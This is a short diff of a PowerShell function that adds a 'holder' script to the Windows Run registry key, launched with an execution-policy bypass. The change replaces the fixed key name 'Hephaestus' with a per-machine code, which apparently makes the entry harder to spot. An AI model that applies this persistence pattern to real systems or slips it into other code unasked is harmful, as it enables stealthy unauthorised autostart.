@@ -4,7 +4,7 @@
 function Add-HolderToStartup {
     
     $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $keyName = "Hephaestus"
+    $keyName = Get-MachineCode
     $holderPath = Get-HolderPath
     $value = "powershell.exe -ExecutionPolicy Bypass -File `"$holderPath`" -ArgumentList '-autostart true'"
 
